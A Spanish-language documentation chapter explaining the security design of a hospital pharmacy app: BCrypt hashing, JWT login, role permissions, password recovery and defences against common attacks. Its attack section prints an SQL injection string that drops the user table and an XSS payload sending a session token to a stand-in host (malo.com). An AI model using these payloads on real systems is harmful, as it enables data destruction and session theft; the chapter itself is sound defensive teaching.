# 08 — Seguridad explicada

## 1. Dos preguntas distintas

- **Autenticación**: ¿**quién** sos? (usuario y contraseña → token)
- **Autorización**: ¿**qué** podés hacer? (rol → permisos)

Como en un edificio: en la entrada te piden el DNI (autenticación) y te dan una tarjeta que abre
solo algunos pisos (autorización).

## 2. Contraseñas: nunca se guardan

Si la base guardara las contraseñas tal cual y alguien la robara, tendría todas las contraseñas (y
mucha gente usa la misma en todos lados). Por eso se guarda un **hash**.

### Qué es un hash

Una función que transforma un texto en otro, de forma que:

- Siempre da lo mismo para la misma entrada.
- **No se puede volver atrás** (del hash no se obtiene la contraseña).
- Un cambio mínimo en la entrada cambia todo el resultado.

Para verificar el login no hace falta "desencriptar": se calcula el hash de lo que escribió la
persona y se compara con el guardado.

> **Ojo:** hash **no** es encriptar. Lo encriptado se puede desencriptar con la clave; un hash no
> se revierte.

### BCrypt

Las funciones de hash comunes (SHA-256) son **rapidísimas**, y eso es malo para contraseñas: un
atacante con la base robada podría probar miles de millones por segundo. **BCrypt** es lento a
propósito y agrega una **sal** (un valor aleatorio distinto por usuario), así dos personas con la
misma contraseña tienen hashes distintos.

Un hash BCrypt se ve así:

```
$2a$12$R9h/cIPz0gi.URNNX3kh2OPST9/PgBkqquzi.Ss7KIUgO2t0jWMUW
 │  │  └──────── sal ───────┘└────────── hash ──────────┘
 │  └ costo: 12 → 2^12 = 4096 rondas
 └ versión
```

> **En el proyecto:** `new BCryptPasswordEncoder(12)` en `SeguridadConfig`. Contraseñas de 8 a 72
> caracteres (BCrypt no usa más de 72 bytes). La columna es `usuario.password_hash`, y **ningún DTO
> la incluye**: nunca sale por la API.

## 3. El login, paso a paso

```mermaid
sequenceDiagram
    actor P as Persona
    participant F as Frontend
    participant A as AuthService
    participant M as AuthenticationManager (Spring)
    participant D as Base
    P->>F: farmaceutico / demo1234
    F->>A: POST /api/auth/login
    A->>M: authenticate(usuario, contraseña)
    M->>D: buscar "farmaceutico"
    M->>M: BCrypt.matches("demo1234", hash guardado)
    alt falla (no existe / inactivo / contraseña mal)
        M-->>A: AuthenticationException
        A-->>F: 401 "Usuario o contraseña incorrectos."
    else ok
        A->>A: TokenService.emitir(id)
        A-->>F: 200 { token, expiraEn, usuario con permisos }
    end
```

Detalles de seguridad:

- **Mismo mensaje para todo error.** Si dijera "el usuario no existe", un atacante sabría qué
  usuarios existen. Incluso cuando el usuario no existe, Spring calcula un hash igual, para que el
  **tiempo de respuesta** tampoco lo delate.
- El nombre de usuario no distingue mayúsculas (se guarda en minúsculas).
- No hay **registro público**: solo un administrador crea usuarios (era el problema 5 del
  prototipo).

## 4. El token JWT

Después del login, el servidor no "recuerda" a nadie (es *stateless*). En su lugar, le da al
navegador un **token**: un texto firmado que el navegador manda en cada pedido.

### Cómo es un JWT

Tres partes en Base64, separadas por puntos:

```
eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJmYXJtYWNpYS1ob3NwaXRhbGFyaWEiLCJzdWIiOiIyIiwiaWF0IjoxNzYyOTc4MDAwLCJleHAiOjE3NjMwMDY4MDB9.Xf3k...
└──── cabecera ────┘ └──────────────────────────── datos (claims) ────────────────────────────┘ └ firma ┘
```

Decodificado:

```json
// cabecera
{ "alg": "HS256" }
// datos
{ "iss": "farmacia-hospitalaria",   // emisor
  "sub": "2",                        // id del usuario
  "iat": 1762978000,                 // emitido (segundos desde 1970)
  "exp": 1763006800 }                // vence (8 horas después)
```

> **Ojo:** el contenido **no está cifrado**: cualquiera puede leerlo (pegalo en https://jwt.io).
> Por eso **no lleva datos sensibles** (ni rol, ni nombre). Lo que lo hace seguro es la **firma**.

### La firma

`firma = HMAC-SHA256(cabecera + "." + datos, JWT_SECRET)`

Solo quien conoce `JWT_SECRET` (el servidor) puede generar una firma válida. Si alguien cambia
`"sub": "2"` por `"sub": "1"` para hacerse pasar por el admin, la firma ya no coincide y el
servidor responde **401**.

> **En el proyecto:** `JWT_SECRET` viene de una variable de entorno, con mínimo 32 bytes. Si falta
> o es corta, la aplicación **no arranca** (`JwtProperties`). En el prototipo la clave estaba
> escrita en el código: cualquiera con el código podía fabricar tokens (problema 2).

### Cada pedido

```http
GET /api/medicamentos
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ...
```

El servidor:

1. Verifica la **firma** (¿lo emití yo?).
2. Verifica **`exp`** (¿venció?) usando el reloj de la aplicación.
3. Verifica **`iss`** (¿es de este sistema?).
4. `UsuarioJwtConverter`: busca el usuario por `sub` en la base. Si no existe o está **inactivo**
   → 401.
5. Le asigna los **permisos de su rol actual** (leído de la base).

El paso 4-5 es clave: si el admin desactiva a alguien o le cambia el rol, el efecto es
**inmediato**, aunque su token todavía no haya vencido.

> **Para la defensa:** "El token solo dice quién sos. Qué podés hacer se lee de la base en cada
> pedido. Por eso una baja tiene efecto inmediato. En el prototipo la identidad salía de una
> cabecera que mandaba el navegador y se podía falsificar."

## 5. Roles y permisos

```
Rol            → Permisos
ADMIN          → todos
FARMACEUTICO   → LECTURA, CATALOGO_EDITAR, STOCK_INGRESAR, STOCK_BAJA_AJUSTE, TRANSFERENCIA_CREAR
CONSULTA       → LECTURA
```

¿Por qué permisos y no preguntar directamente por el rol? Porque el código dice **qué se necesita**
(`hasAuthority('STOCK_INGRESAR')`) y no **quién** (`hasRole('ADMIN') or hasRole('FARMACEUTICO')`).
Si mañana se crea un rol "Técnico" que puede ingresar pero no transferir, solo se toca el enum
`Rol`.

Cada método de controlador declara su permiso:

```java
@PostMapping
@PreAuthorize("hasAuthority('TRANSFERENCIA_CREAR')")
public ResponseEntity<TransferenciaResponse> crear(...) { ... }
```

### 401 vs 403

| | 401 Unauthorized | 403 Forbidden |
|---|---|---|
| Significa | No sé quién sos. | Sé quién sos, pero no podés. |
| Casos | Sin token, token alterado, vencido, usuario desactivado. | CONSULTA intentando crear un medicamento. |
| El frontend | Borra la sesión y lleva al ingreso. | Muestra "No tenés permiso para esta acción." |

Los dos salen en JSON (ProblemDetail), escritos por `ErroresSeguridad`.

### Ocultar no es proteger

El frontend esconde los botones que tu rol no puede usar (`puede('CATALOGO_EDITAR')`). Eso es
**comodidad**. La seguridad está en el backend: si alguien modifica el JavaScript o llama a la API
con otro programa, igual recibe 403.

## 6. Recuperación de contraseña

1. La persona pide un código con su usuario.
2. El servidor genera 6 números con `SecureRandom` (aleatorio criptográfico).
3. Guarda el **hash BCrypt** del código (no el código), con vencimiento en 15 minutos. Anula los
   pedidos anteriores.
4. "Envía" el código. Hoy es **simulado**: `CorreoSimulado` solo deja constancia en el log (sin el
   código) y, en el perfil `demo`, la respuesta trae el código para mostrarlo.
5. La persona manda usuario + código + contraseña nueva. Se verifica el código con BCrypt.
6. Máximo **5 intentos**: después, el código queda anulado aunque el siguiente sea el correcto.

Seguridad extra:

- La respuesta del paso 1 es **la misma exista o no el usuario** (no revela usuarios).
- El contador de intentos se guarda **aunque la operación falle** (`noRollbackFor`): si se
  revirtiera, el atacante podría intentar infinitas veces.
- El contador se incrementa con **bloqueo pesimista**, para que intentos simultáneos no lo burlen.

## 7. Ataques comunes y cómo se evitan

### Inyección SQL

Meter código SQL en un campo para que la base lo ejecute.

```
Buscar: x'; drop table usuario; --
```

**Defensa:** consultas **parametrizadas** (JPA y `JdbcClient` con `:parametros`): la base trata el
valor como dato, nunca como código. El campo de orden (`sort`), que no se puede parametrizar, se
valida contra una **lista blanca**.

### XSS (Cross-Site Scripting)

Guardar un texto con código que se ejecute en el navegador de otra persona. Por ejemplo, un
medicamento llamado:

```html
<img src=x onerror="fetch('https://malo.com?t='+sessionStorage.token)">
```

Si la pantalla insertara ese texto como HTML, robaría el token de cada persona que la abra.

**Defensas en capas:**

1. **React escapa** todo el texto: lo muestra como texto, no como HTML.
2. **ESLint prohíbe** `innerHTML` y `dangerouslySetInnerHTML`.
3. **CSP** (Content Security Policy) en nginx: el navegador solo ejecuta scripts del propio sitio;
   aunque se colara uno, no podría mandar datos afuera (`connect-src 'self'`).
4. Prueba automática: `seguridad.test.tsx` verifica que ese texto se ve como texto.

### Inyección de fórmulas en CSV/Excel

Si un dato empieza con `=`, Excel lo ejecuta como fórmula al abrir el CSV (`=HYPERLINK(...)` puede
mandar datos a otro sitio). **Defensa:** `Csv` antepone `'` a los valores que empiezan con `=`,
`+`, `-`, `@`, tabulación o retorno de carro. Prueba: `CsvTest`.

### CSRF (Cross-Site Request Forgery)

Una página maliciosa hace que tu navegador mande un pedido a otro sitio donde estás logueado,
aprovechando que **el navegador agrega las cookies solo**.

**Por qué no aplica acá:** la API no usa cookies. El token va en la cabecera `Authorization`, que
el navegador **no agrega por su cuenta**: solo nuestro código la pone. Por eso CSRF está
deshabilitado en `SeguridadConfig` (decisión documentada).

### CORS

Regla del navegador: una página de un origen no puede leer respuestas de otro origen salvo que ese
otro lo autorice. **En el proyecto:** el frontend y la API están detrás del mismo proxy (mismo
origen), así que CORS está vacío por defecto. Si se configura (`CORS_ORIGENES`), nunca con `*`.

### Fuerza bruta en el login

Probar contraseñas una tras otra. BCrypt hace cada intento lento. Un límite de intentos de login
quedó como **mejora futura**.

## 8. Dónde guarda el token el frontend

En **`sessionStorage`**:

| Opción | Ventaja | Desventaja |
|---|---|---|
| `sessionStorage` (elegida) | Se borra al cerrar la pestaña (PC compartidas). Cada pestaña tiene su sesión. | JavaScript puede leerlo → hay que prevenir XSS (ver arriba). |
| `localStorage` | Sobrevive a cerrar el navegador. | Queda guardado en PC compartidas. |
| Cookie HttpOnly | JavaScript no puede leerla (más resistente a XSS). | El navegador la manda sola → hay que proteger CSRF; cambiaría el backend. |

Además: al recargar, el frontend no confía en lo guardado: pide `/api/auth/me` para tener los
permisos frescos. Al tocar "Salir", borra el token y la caché de datos.

## 9. Configuración segura

| Medida | Dónde |
|---|---|
| Secretos solo en variables de entorno (`.env`, que no se sube a git). | `.env.example`, `.gitignore` |
| La app no arranca sin `JWT_SECRET` válido ni con `demo` + `prod`. | `JwtProperties`, `PerfilesIncompatibles` |
| Swagger apagado en producción. | `application-prod.yml` |
| Actuator solo `/actuator/health`, sin detalles. | `application.yml` |
| Los errores 500 no muestran detalles internos, solo un `errorId`. | `ManejadorErrores` |
| Nunca se loguean contraseñas, tokens ni el código de recuperación. | Convención + revisión |
| Puertos de Docker solo en `127.0.0.1`. | `docker-compose.yml` |
| Contenedores sin usuario root. | Dockerfiles |

## 10. Los 8 problemas del prototipo, resueltos

| # | Problema | Solución | Prueba |
|---|---|---|---|
| 1 | Identidad en una cabecera falsificable | Identidad solo del JWT validado; permisos de la base | `SeguridadIT.laCabeceraXUserIdNoCambiaLaIdentidad` |
| 2 | Clave del JWT en el código | Variable de entorno ≥ 32 bytes | `ConfiguracionTest` |
| 3 | Stock negativo | Validación + entidad + CHECK + bloqueo | `TransferenciaConcurrenciaIT`, `LoteTest` |
| 4 | Hash expuesto | Solo DTO, sin hash | `SeguridadIT.ningunaRespuestaExponeLaContrasenaNiElHash` |
| 5 | Registro libre | Sin registro; solo ADMIN crea | `SeguridadIT.farmaceuticoNoPuedeGestionarUsuarios` |
| 6 | Fechas como texto | Tipos de fecha reales + `Clock` | `AlertaServiceTest` |
| 7 | Borrado en cascada | Bajas lógicas, FK sin cascada | `ProveedorServiceTest` |
| 8 | Errores genéricos, sin tests | ProblemDetail con código; pruebas en `verify` | `ErroresIT` |
